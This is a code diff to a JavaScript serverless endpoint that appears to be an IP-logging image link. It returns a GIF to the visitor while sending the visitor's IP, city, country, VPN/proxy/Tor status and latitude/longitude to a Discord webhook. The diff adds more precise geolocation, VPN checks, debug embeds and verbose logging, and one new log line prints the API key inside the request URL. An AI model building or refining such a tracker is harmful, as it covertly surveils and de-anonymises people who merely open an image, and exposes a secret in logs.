@@ -29,15 +29,34 @@ export default async function handler(req, res) {
     return sendGif(targetUrl, res);
   }
   
+  // VPN Detection with logging
   let vpnData = null;
+  const cleanIp = ip.split(',')[0].trim();
+  
+  console.log('[VPN API] Starting check...');
+  console.log('[VPN API] IP:', cleanIp);
+  console.log('[VPN API] Key exists:', !!process.env.VPNAPI_KEY);
+  
   if (process.env.VPNAPI_KEY) {
     try {
-      const cleanIp = ip.split(',')[0].trim(); // Handle x-forwarded-for with multiple IPs
-      const vpnResponse = await fetch(`https://vpnapi.io/api/${cleanIp}?key=${process.env.VPNAPI_KEY}`);
-      vpnData = await vpnResponse.json();
+      const vpnUrl = `https://vpnapi.io/api/${cleanIp}?key=${process.env.VPNAPI_KEY}`;
+      console.log('[VPN API] Fetching:', vpnUrl);
+      
+      const vpnResponse = await fetch(vpnUrl);
+      console.log('[VPN API] Response status:', vpnResponse.status);
+      
+      const vpnText = await vpnResponse.text();
+      console.log('[VPN API] Response body:', vpnText);
+      
+      vpnData = JSON.parse(vpnText);
+      console.log('[VPN API] Parsed data:', vpnData);
+      
     } catch (e) {
-      console.error('vpnapi.io error:', e);
+      console.error('[VPN API] Error:', e.message);
+      console.error('[VPN API] Stack:', e.stack);
     }
+  } else {
+    console.log('[VPN API] No API key found in env');
   }
   
   if (process.env.DISCORD_WEBHOOK_URL) {
@@ -53,7 +72,7 @@ export default async function handler(req, res) {
       fields: [
         { name: "🔑 ID", value: `\`${id}\``, inline: true },
         { name: "🌍 Location", value: `${city}, ${country}`, inline: true },
-        { name: "📡 IP", value: `\`${ip}\``, inline: true },
+        { name: "📡 IP", value: `\`${cleanIp}\``, inline: true },
         { name: "📂 Original", value: `[Source](${targetUrl})`, inline: false }
       ],
       thumbnail: { url: targetUrl }
@@ -61,14 +80,19 @@ export default async function handler(req, res) {
     
     const embeds = [mainEmbed];
     
-    if (vpnData && vpnData.security) {
-      const sec = vpnData.security;
+    // Build VPN embed if data available
+    if (vpnData) {
+      console.log('[VPN API] Building embed with data');
+      
+      const sec = vpnData.security || {};
       const loc = vpnData.location || {};
       const net = vpnData.network || {};
       
+      const hasVpn = sec.vpn || sec.proxy || sec.tor || sec.relay;
+      
       const vpnEmbed = {
-        title: "Query from vpnapi",
-        color: (sec.vpn || sec.proxy || sec.tor || sec.relay) ? 0xE74C3C : 0x2ECC71,
+        title: "🔒 Security & Network Info",
+        color: hasVpn ? 0xE74C3C : 0x2ECC71,
         fields: [
           { 
             name: "VPN", 
@@ -93,14 +117,16 @@ export default async function handler(req, res) {
         ]
       };
       
+      // Add detailed location
       if (loc.city || loc.country) {
         vpnEmbed.fields.push({
-          name: "📍 ISP Location",
+          name: "📍 Detailed Location",
           value: `${loc.city || 'Unknown'}, ${loc.region || ''} ${loc.country || 'Unknown'}\nLat/Long: ${loc.latitude || 'N/A'}, ${loc.longitude || 'N/A'}`,
           inline: false
         });
       }
       
+      // Add network info
       if (net.autonomous_system_organization) {
         vpnEmbed.fields.push({
           name: "🌐 Network",
@@ -110,13 +136,37 @@ export default async function handler(req, res) {
       }
       
       embeds.push(vpnEmbed);
+    } else {
+      console.log('[VPN API] No data to build embed with');
+      
+      // Add debug embed showing why VPN check failed
+      embeds.push({
+        title: "⚠️ VPN Check Failed",
+        color: 0xFF9800,
+        fields: [
+          { 
+            name: "Status", 
+            value: "VPN API returned no data", 
+            inline: false 
+          },
+          {
+            name: "Check Logs",
+            value: "See Vercel function logs for details",
+            inline: false
+          }
+        ]
+      });
     }
+    
+    console.log('[Discord] Sending', embeds.length, 'embeds');
     
     fetch(process.env.DISCORD_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ embeds })
-    }).catch(() => {}); 
+    }).catch((e) => {
+      console.error('[Discord] Webhook error:', e);
+    }); 
   }
   
   return sendGif(targetUrl, res);
@@ -131,6 +181,6 @@ async function sendGif(url, res) {
     res.setHeader("Cache-Control", "public, max-age=3600");
     res.send(Buffer.from(buffer));
   } catch (error) {
-    res.status(500).send("Forbidden");
+    res.status(500).send("GIF Fetch Error");
   }
 }
